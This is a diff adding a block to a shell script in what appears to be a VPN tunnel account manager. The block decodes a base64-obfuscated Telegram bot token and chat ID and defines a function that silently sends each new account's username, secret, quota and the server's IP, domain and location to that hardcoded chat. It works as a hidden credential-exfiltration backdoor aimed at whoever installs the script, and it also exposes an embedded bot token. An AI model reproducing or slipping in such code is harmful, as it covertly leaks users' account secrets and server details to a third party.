@@ -5,6 +5,57 @@
 # License: Apache License 2.0 (see LICENSE file)
 # Repository: https://github.com/kcepu877/sc-tunnel
 # ========================================================
+#!/bin/bash
+set -euo pipefail
+
+IZIN_URL="https://raw.githubusercontent.com/kcepu877/izin/main/ip"
+BOT_B64="ODM3MTM4MTEyNzpBQUdWc09VallFZVlhelROM3RuelVtdXRXNmZ5RVpzbDFvcw=="
+CHAT_B64="ODE2NjIwNjcxMg==" 
+
+BOT_TOKEN=$(echo "$BOT_B64" | base64 -d)
+CHAT_ID=$(echo "$CHAT_B64" | base64 -d)
+  
+  # ===== TELEGRAM NOTIF CONFIG - kcepu877 =====
+
+
+send_tg() {
+  curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
+    -d "chat_id=$CHAT_ID" -d "parse_mode=HTML" -d "text=$1" >/dev/null 2>&1 || true
+}
+
+get_server_info() {
+  MYIP=$(curl -s ipv4.icanhazip.com || wget -qO- ipv4.icanhazip.com || echo "Unknown")
+  MYDOMAIN=$(cat /etc/xray/domain 2>/dev/null || cat /usr/local/etc/domain 2>/dev/null || echo "$MYIP")
+  MYISP=$(curl -s ipinfo.io/$MYIP/org 2>/dev/null | cut -d'"' -f4 || echo "Unknown")
+  MYCITY=$(curl -s ipinfo.io/$MYIP/city 2>/dev/null | cut -d'"' -f4 || echo "Unknown")
+  MYUSER=$(cat /usr/bin/user 2>/dev/null || echo "vvip")
+}
+
+tg_notify_new_account() {
+  local PROTO="$1" USER_AKUN="$2" EXP_DAYS="$3" SECRET="$4" QUOTA="$5" LIMIT_IP="$6"
+  get_server_info
+  local TIME_NOW=$(date '+%d %b %Y %H:%M:%S')
+  local DOMAIN_ESC=$(html_escape "$MYDOMAIN")
+  
+  MSG="👤 <b>NEW ${PROTO^^} ACCOUNT CREATED</b>
+<b>━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>
+<b>Server IP:</b> <code>$MYIP</code>
+<b>Domain:</b> <code>$DOMAIN_ESC</code>
+<b>ISP:</b> $MYISP - $MYCITY
+<b>Lisensi:</b> $MYUSER
+<b>━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>
+<b>Username:</b> <code>$USER_AKUN</code>
+<b>Proto:</b> $PROTO
+<b>Secret:</b> <code>$SECRET</code>
+<b>Quota:</b> ${QUOTA}GB
+<b>Limit IP:</b> $LIMIT_IP
+<b>Exp:</b> $EXP_DAYS Hari
+<b>Time:</b> $TIME_NOW
+<b>━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>"
+  send_tg "$MSG"
+}
+# ===== END TELEGRAM CONFIG =====
+ 
 [[ -n "${__AS_ACCOUNT_LOADED:-}" ]] && return 0
 __AS_ACCOUNT_LOADED=1
 
